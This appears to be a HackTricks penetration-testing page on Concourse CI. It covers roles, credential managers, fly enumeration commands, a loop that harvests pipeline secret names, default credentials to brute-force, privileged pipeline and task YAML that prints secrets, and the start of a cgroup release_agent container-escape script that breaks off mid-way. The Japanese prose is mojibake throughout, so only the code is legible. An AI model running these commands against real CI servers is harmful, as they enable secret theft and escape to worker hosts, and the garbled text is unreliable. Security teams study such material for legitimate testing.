# Concourse åˆ—æŒ™ã¨æ”»æ’ƒ

## Concourse åˆ—æŒ™ã¨æ”»æ’ƒ

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong>ã‚’é€šã˜ã¦ã€ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã¾ã—ã‚‡ã†ï¼</summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

- **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼**ã—ãŸã„å ´åˆã‚„ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **Discord ã‚°ãƒ«ãƒ¼ãƒ—**ã«å‚åŠ ã™ã‚‹ ğŸ’¬(https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
- **HackTricks** (https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>

### ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®å½¹å‰²ã¨æ¨©é™

Concourse ã«ã¯æ¬¡ã® 5 ã¤ã®å½¹å‰²ãŒã‚ã‚Šã¾ã™:

- _Concourse_ **Admin**: ã“ã®å½¹å‰²ã¯**ãƒ¡ã‚¤ãƒ³ãƒãƒ¼ãƒ **ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®åˆæœŸ Concourse ãƒãƒ¼ãƒ ï¼‰ã®æ‰€æœ‰è€…ã«ã®ã¿ä¸ãˆã‚‰ã‚Œã¾ã™ã€‚ç®¡ç†è€…ã¯ä»–ã®ãƒãƒ¼ãƒ ã‚’**æ§‹æˆ**ã§ãã¾ã™ï¼ˆä¾‹: `fly set-team`, `fly destroy-team`...ï¼‰ã€‚ã“ã®å½¹å‰²ã®æ¨©é™ã¯ RBAC ã«ã‚ˆã£ã¦å½±éŸ¿ã‚’å—ã‘ã¾ã›ã‚“ã€‚
- **owner**: ãƒãƒ¼ãƒ ã®æ‰€æœ‰è€…ã¯ã€ãƒãƒ¼ãƒ å†…ã®ã™ã¹ã¦ã‚’**å¤‰æ›´**ã§ãã¾ã™ã€‚
- **member**: ãƒãƒ¼ãƒ ãƒ¡ãƒ³ãƒãƒ¼ã¯ã€**ãƒãƒ¼ãƒ ã®ã‚¢ã‚»ãƒƒãƒˆå†…ã§èª­ã¿å–ã‚Šã¨æ›¸ãè¾¼ã¿**ãŒã§ãã¾ã™ãŒã€ãƒãƒ¼ãƒ ã®è¨­å®šã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
- **pipeline-operator**: ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ã¯ã€ãƒ“ãƒ«ãƒ‰ã®ãƒˆãƒªã‚¬ãƒªãƒ³ã‚°ã‚„ãƒªã‚½ãƒ¼ã‚¹ã®ãƒ”ãƒ³ç•™ã‚ãªã©ã®**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³æ“ä½œ**ã‚’å®Ÿè¡Œã§ãã¾ã™ãŒã€ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³æ§‹æˆã‚’æ›´æ–°ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
- **viewer**: ãƒãƒ¼ãƒ ãƒ“ãƒ¥ãƒ¼ã‚¢ãƒ¼ã¯ã€ãƒãƒ¼ãƒ ã¨ãã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã«**ã€Œèª­ã¿å–ã‚Šå°‚ç”¨ã€ã‚¢ã‚¯ã‚»ã‚¹**æ¨©é™ã‚’æŒã¡ã¾ã™ã€‚

{% hint style="info" %}
ã•ã‚‰ã«ã€**ownerã€memberã€pipeline-operatorã€viewer ã®æ¨©é™ã¯** RBAC ã‚’æ§‹æˆã™ã‚‹ã“ã¨ã§å¤‰æ›´ã§ãã¾ã™ï¼ˆã‚ˆã‚Šå…·ä½“çš„ã«ã¯ã€ãã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ§‹æˆã§ãã¾ã™ï¼‰ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html) ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

Concourse ã¯**ãƒãƒ¼ãƒ å†…ã«ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ã‚°ãƒ«ãƒ¼ãƒ—åŒ–**ã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒãƒ¼ãƒ ã«æ‰€å±ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãã‚Œã‚‰ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ç®¡ç†ã§ãã€**è¤‡æ•°ã®ãƒãƒ¼ãƒ **ãŒå­˜åœ¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯è¤‡æ•°ã®ãƒãƒ¼ãƒ ã«æ‰€å±ã—ã€ãã‚Œãã‚Œã®ãƒãƒ¼ãƒ å†…ã§ç•°ãªã‚‹æ¨©é™ã‚’æŒã¤ã“ã¨ãŒã§ãã¾ã™ã€‚

### Vars & Credential Manager

YAML æ§‹æˆã§ã¯ã€`((_source-name_:_secret-path_._secret-field_))` ã®æ§‹æ–‡ã‚’ä½¿ç”¨ã—ã¦å€¤ã‚’æ§‹æˆã§ãã¾ã™ã€‚\
[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‹ã‚‰:](https://concourse-ci.org/vars.html#var-syntax) **source-name ã¯ã‚ªãƒ—ã‚·ãƒ§ãƒ³**ã§ã‚ã‚Šã€çœç•¥ã•ã‚ŒãŸå ´åˆã¯[ã‚¯ãƒ©ã‚¹ã‚¿å…¨ä½“ã®è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£](https://concourse-ci.org/vars.html#cluster-wide-credential-manager)ãŒä½¿ç”¨ã•ã‚Œã‚‹ã‹ã€å€¤ãŒ[é™çš„ã«](https://concourse-ci.org/vars.html#static-vars)æä¾›ã•ã‚Œã¾ã™ã€‚\
ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã® `_secret-field_` ã¯ã€å–å¾—ã—ãŸã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ä¸­ã§èª­ã¿å–ã‚‹ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚çœç•¥ã•ã‚ŒãŸå ´åˆã€è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ã¯ã€ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«ã¯å–å¾—ã—ãŸè³‡æ ¼æƒ…å ±ã‹ã‚‰ 'ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰' ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€_**secret-path**_ ã¨ _**secret-field**_ ã¯ã€`.` ã‚„ `:` ã®ã‚ˆã†ãª**ç‰¹æ®Šæ–‡å­—ã‚’å«ã‚€**å ´åˆã¯ã€äºŒé‡å¼•ç”¨ç¬¦ `"..."` ã§å›²ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€`((source:"my.secret"."field:1"))` ã¯ã€_secret-path_ ã‚’ `my.secret` ã«ã€_secret-field_ ã‚’ `field:1` ã«è¨­å®šã—ã¾ã™ã€‚

#### é™çš„ Vars

é™çš„ vars ã¯**ã‚¿ã‚¹ã‚¯ã‚¹ãƒ†ãƒƒãƒ—**ã§æŒ‡å®šã§ãã¾ã™ã€‚
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
#### å¼•æ•°ã‚’ä½¿ç”¨ã™ã‚‹ã‹ã€æ¬¡ã® `fly` **å¼•æ•°** ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

- `-v` ã¾ãŸã¯ `--var` `NAME=VALUE` ã¯ã€æ–‡å­—åˆ— `VALUE` ã‚’å¤‰æ•° `NAME` ã®å€¤ã¨ã—ã¦è¨­å®šã—ã¾ã™ã€‚
- `-y` ã¾ãŸã¯ `--yaml-var` `NAME=VALUE` ã¯ã€`VALUE` ã‚’YAMLã¨ã—ã¦è§£æã—ã€å¤‰æ•° `NAME` ã®å€¤ã¨ã—ã¦è¨­å®šã—ã¾ã™ã€‚
- `-i` ã¾ãŸã¯ `--instance-var` `NAME=VALUE` ã¯ã€`VALUE` ã‚’YAMLã¨ã—ã¦è§£æã—ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å¤‰æ•° `NAME` ã®å€¤ã¨ã—ã¦è¨­å®šã—ã¾ã™ã€‚[ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ã‚°ãƒ«ãƒ¼ãƒ—åŒ–](https://concourse-ci.org/instanced-pipelines.html) ã‚’å‚ç…§ã—ã¦ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹å¤‰æ•°ã«ã¤ã„ã¦è©³ã—ãå­¦ã¶ã“ã¨ãŒã§ãã¾ã™ã€‚
- `-l` ã¾ãŸã¯ `--load-vars-from` `FILE` ã¯ã€`FILE` ã‚’èª­ã¿è¾¼ã¿ã€å€¤ã«å¯¾ã™ã‚‹å¤‰æ•°åã®ãƒãƒƒãƒ”ãƒ³ã‚°ã‚’å«ã‚€YAMLãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª­ã¿è¾¼ã¿ã€ã™ã¹ã¦ã‚’è¨­å®šã—ã¾ã™ã€‚

#### è³‡æ ¼æƒ…å ±ç®¡ç†

ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã§ **è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼** ã‚’æŒ‡å®šã™ã‚‹æ–¹æ³•ã«ã¯ã•ã¾ã–ã¾ãªæ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚[https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html) ã§è©³ç´°ã‚’èª­ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€Concourse ã¯ã•ã¾ã–ã¾ãªè³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ï¼š

- [Vault è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼](https://concourse-ci.org/vault-credential-manager.html)
- [CredHub è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼](https://concourse-ci.org/credhub-credential-manager.html)
- [AWS SSM è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼](https://concourse-ci.org/aws-ssm-credential-manager.html)
- [AWS Secrets Manager è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼](https://concourse-ci.org/aws-asm-credential-manager.html)
- [Kubernetes è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼](https://concourse-ci.org/kubernetes-credential-manager.html)
- [Conjur è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼](https://concourse-ci.org/conjur-credential-manager.html)
- [è³‡æ ¼æƒ…å ±ã®ã‚­ãƒ£ãƒƒã‚·ãƒ¥](https://concourse-ci.org/creds-caching.html)
- [è³‡æ ¼æƒ…å ±ã®ãƒã‚¹ã‚­ãƒ³ã‚°](https://concourse-ci.org/creds-redacting.html)
- [å–å¾—ã®å¤±æ•—æ™‚ã®ãƒªãƒˆãƒ©ã‚¤](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Concourse ã« **æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹æ¨©** ãŒã‚ã‚‹å ´åˆã€Concourse ãŒãã‚Œã‚‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã€ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ **å¤–éƒ¨ã«æŒã¡å‡ºã™** ã‚¸ãƒ§ãƒ–ã‚’ä½œæˆã§ãã¾ã™ã€‚
{% endhint %}

### Concourse åˆ—æŒ™

Concourse ç’°å¢ƒã‚’åˆ—æŒ™ã™ã‚‹ã«ã¯ã€ã¾ãš **æœ‰åŠ¹ãªè³‡æ ¼æƒ…å ±** ã‚’åé›†ã™ã‚‹ã‹ã€ãŠãã‚‰ã `.flyrc` æ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«å†…ã« **èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³** ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

#### ãƒ­ã‚°ã‚¤ãƒ³ã¨ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ—æŒ™

- ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã«ã¯ã€**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ**ã€**ãƒãƒ¼ãƒ å** (ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã¯ `main`)ã€ãŠã‚ˆã³ **ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ‰€å±ã™ã‚‹ãƒãƒ¼ãƒ ** ã‚’çŸ¥ã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
- `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`
- è¨­å®šã•ã‚ŒãŸ **ã‚¿ãƒ¼ã‚²ãƒƒãƒˆ** ã‚’å–å¾—ã—ã¾ã™ï¼š
- `fly targets`
- è¨­å®šã•ã‚ŒãŸ **ã‚¿ãƒ¼ã‚²ãƒƒãƒˆæ¥ç¶š** ãŒã¾ã  **æœ‰åŠ¹** ã‹ã©ã†ã‹ã‚’å–å¾—ã—ã¾ã™ï¼š
- `fly -t <target> status`
- æŒ‡å®šã•ã‚ŒãŸã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«å¯¾ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã® **å½¹å‰²** ã‚’å–å¾—ã—ã¾ã™ï¼š
- `fly -t <target> userinfo`

{% hint style="info" %}
**API ãƒˆãƒ¼ã‚¯ãƒ³** ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ `$HOME/.flyrc` ã« **ä¿å­˜** ã•ã‚Œã¾ã™ã€‚ãƒã‚·ãƒ³ã‚’ç•¥å¥ªã™ã‚‹ã¨ã€ãã“ã«è³‡æ ¼æƒ…å ±ãŒè¦‹ã¤ã‹ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

#### ãƒãƒ¼ãƒ ã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼

- ãƒãƒ¼ãƒ ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™
- `fly -t <target> teams`
- ãƒãƒ¼ãƒ å†…ã®å½¹å‰²ã‚’å–å¾—ã—ã¾ã™
- `fly -t <target> get-team -n <team-name>`
- ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã—ã¾ã™
- `fly -t <target> active-users`

#### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³

- ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ **ãƒªã‚¹ãƒˆ** ã—ã¾ã™ï¼š
- `fly -t <target> pipelines -a`
- ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã® yaml ã‚’ **å–å¾—** ã—ã¾ã™ï¼ˆå®šç¾©ã« **æ©Ÿå¯†æƒ…å ±** ãŒå«ã¾ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼‰ï¼š
- `fly -t <target> get-pipeline -p <pipeline-name>`
- ã™ã¹ã¦ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ **æ§‹æˆå¤‰æ•°** ã‚’å–å¾—ã—ã¾ã™
- `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
- ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ **ã™ã¹ã¦ã®ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆå** ã‚’å–å¾—ã—ã¾ã™ï¼ˆã‚¸ãƒ§ãƒ–ã‚’ä½œæˆ/å¤‰æ›´ã—ãŸã‚Šã€ã‚³ãƒ³ãƒ†ãƒŠã‚’ä¹—ã£å–ã£ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ãã‚Œã‚‰ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™ã“ã¨ãŒã§ãã¾ã™ï¼‰ï¼š
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### ã‚³ãƒ³ãƒ†ãƒŠã¨ãƒ¯ãƒ¼ã‚«ãƒ¼

* **ãƒ¯ãƒ¼ã‚«ãƒ¼**ã®ãƒªã‚¹ãƒˆ:
* `fly -t <target> workers`
* **ã‚³ãƒ³ãƒ†ãƒŠ**ã®ãƒªã‚¹ãƒˆ:
* `fly -t <target> containers`
* **ãƒ“ãƒ«ãƒ‰**ã®ãƒªã‚¹ãƒˆ (å®Ÿè¡Œä¸­ã®ã‚‚ã®ã‚’ç¢ºèªã™ã‚‹ãŸã‚):
* `fly -t <target> builds`

### Concourseæ”»æ’ƒ

#### è³‡æ ¼æƒ…å ±ã®ç·å½“ãŸã‚Šæ”»æ’ƒ

* admin:admin
* test:test

#### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®åˆ—æŒ™

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆåã¨å¤‰æ•°ã‚’å–å¾—**ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¾ã—ãŸã€‚**å¤‰æ•°ã«ã¯æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Š**ã€**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®åå‰ã¯å¾Œã§ç›—ã‚€**ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚

#### å®Ÿè¡Œä¸­ã¾ãŸã¯æœ€è¿‘å®Ÿè¡Œã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒŠå†…ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³

ååˆ†ãªæ¨©é™ãŒã‚ã‚‹å ´åˆï¼ˆ**ãƒ¡ãƒ³ãƒãƒ¼æ¨©é™ä»¥ä¸Š**ï¼‰ã€**ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã¨ãƒ­ãƒ¼ãƒ«ã‚’ãƒªã‚¹ãƒˆ**ã—ã¦ã€å˜ã«`<pipeline>/<job>` **ã‚³ãƒ³ãƒ†ãƒŠ**å†…ã§**ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—**ã§ãã¾ã™ã€‚
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
#### ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã¨ã€æ¬¡ã®ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š

* **ã‚³ãƒ³ãƒ†ãƒŠ**å†…ã®**ç§˜å¯†**ã‚’ç›—ã‚€
* ãƒãƒ¼ãƒ‰ã«**è„±å‡º**ã‚’è©¦ã¿ã‚‹
* **ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’åˆ—æŒ™/æ‚ªç”¨ã™ã‚‹ï¼ˆå¯èƒ½ã§ã‚ã‚Œã°ã€ãƒãƒƒãƒ‰ãŠã‚ˆã³ãƒãƒ¼ãƒ‰ã‹ã‚‰ï¼‰

#### ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®ä½œæˆ/å¤‰æ›´

ååˆ†ãªæ¨©é™ï¼ˆ**ãƒ¡ãƒ³ãƒãƒ¼æ¨©é™ä»¥ä¸Š**ï¼‰ãŒã‚ã‚‹å ´åˆã€**æ–°ã—ã„ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’ä½œæˆ/å¤‰æ›´**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
æ–°ã—ã„ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’**å¤‰æ›´/ä½œæˆ**ã™ã‚‹ã“ã¨ã§ã€æ¬¡ã®ã“ã¨ãŒã§ãã¾ã™ï¼š

- **ç§˜å¯†æƒ…å ±**ã‚’**ç›—ã‚€**ï¼ˆã‚¨ã‚³ãƒ¼ã—ã¦å–å¾—ã™ã‚‹ã‹ã€ã‚³ãƒ³ãƒ†ãƒŠå†…ã«å…¥ã£ã¦`env`ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã«ã‚ˆã‚Šï¼‰
- **ãƒãƒ¼ãƒ‰**ã«**è„±å‡º**ã™ã‚‹ï¼ˆç‰¹æ¨©ã‚’ä¸ãˆã‚‰ã‚ŒãŸå ´åˆ - `privileged: true`ï¼‰
- **ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’åˆ—æŒ™/æ‚ªç”¨ã™ã‚‹ï¼ˆãƒãƒƒãƒ‰ãŠã‚ˆã³ãƒãƒ¼ãƒ‰ã‹ã‚‰ï¼‰
- ä½œæˆã—ãŸãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã‚’**å‰Šé™¤**ã™ã‚‹

#### ã‚«ã‚¹ã‚¿ãƒ ã‚¿ã‚¹ã‚¯ã®å®Ÿè¡Œ

ã“ã‚Œã¯å‰ã®æ–¹æ³•ã¨ä¼¼ã¦ã„ã¾ã™ãŒã€æ–°ã—ã„ãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³å…¨ä½“ã‚’å¤‰æ›´/ä½œæˆã™ã‚‹ä»£ã‚ã‚Šã«ã€**ã‚«ã‚¹ã‚¿ãƒ ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œ**ã™ã‚‹ã ã‘ã§ï¼ˆãŠãã‚‰ãã‚ˆã‚Š**æ…é‡ã«**è¡Œã‚ã‚Œã‚‹ï¼‰ã€
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### ç‰¹æ¨©ã‚¿ã‚¹ã‚¯ã‹ã‚‰ãƒãƒ¼ãƒ‰ã¸ã®è„±å‡º

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**concourseã§ç‰¹æ¨©ã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã™ã‚‹æ–¹æ³•**ã‚’è¦‹ã¦ãã¾ã—ãŸã€‚ã“ã‚Œã¯ã€dockerã‚³ãƒ³ãƒ†ãƒŠã®ç‰¹æ¨©ãƒ•ãƒ©ã‚°ã¨ã¾ã£ãŸãåŒã˜ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’ã‚³ãƒ³ãƒ†ãƒŠã«ä¸ãˆã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ãŸã¨ãˆã°ã€/devå†…ã®ãƒãƒ¼ãƒ‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ‡ãƒã‚¤ã‚¹ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“ã®ã§ã€è„±å‡ºã¯ã‚ˆã‚Šã€Œè¤‡é›‘ã€ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

æ¬¡ã®PoCã§ã¯ã€ã„ãã¤ã‹ã®å°ã•ãªä¿®æ­£ã‚’åŠ ãˆã¦release_agentã‚’ä½¿ç”¨ã—ã¦è„±å‡ºã—ã¾ã™ï¼š
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
